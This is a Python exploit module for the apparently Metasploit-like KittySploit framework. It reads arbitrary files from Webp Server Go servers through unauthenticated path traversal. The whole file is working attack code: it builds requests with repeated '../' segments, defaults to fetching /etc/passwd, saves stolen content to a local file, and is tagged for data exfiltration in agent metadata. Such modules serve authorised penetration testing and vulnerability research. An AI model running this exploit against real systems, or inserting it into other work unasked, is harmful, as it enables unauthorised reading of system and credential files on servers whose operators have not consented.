#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Webp Server Go path traversal file read."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Webp Server Go - Path Traversal File Read',
        'description': (
            'Reads arbitrary files via path traversal in Webp Server Go '
            '(github.com/webp-sh/webp_server_go).'
        ),
        'author': ['KittySploit Team'],
        'platform': Platform.LINUX,
        'references': ['https://github.com/webp-sh/webp_server_go/issues/92'],
        'tags': ['webp', 'webp-server', 'go', 'lfi', 'file-read', 'unauth'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'suggested_followups': ['scanner/http/webp_server_lfi_detect'],
            },
        },
    }

    file_read = OptString('/etc/passwd', 'Absolute remote file path to read', required=True)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)
    traversal_depth = OptInteger(15, 'Number of ../ segments', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip().lstrip('/')
        depth = max(1, int(self.traversal_depth or 15))
        path = '/' + ('../' * depth) + remote
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return ''
        return r.text or ''

    def run(self):
        target = str(self.file_read or '/etc/passwd')
        print_status(f'Reading {target} via Webp Server Go traversal ...')
        body = self.execute(target)
        if not body:
            print_error('Empty response')
            return False
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(body)
            print_success(f'Wrote {len(body)} bytes to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(body if limit <= 0 else body[:limit])
        return True
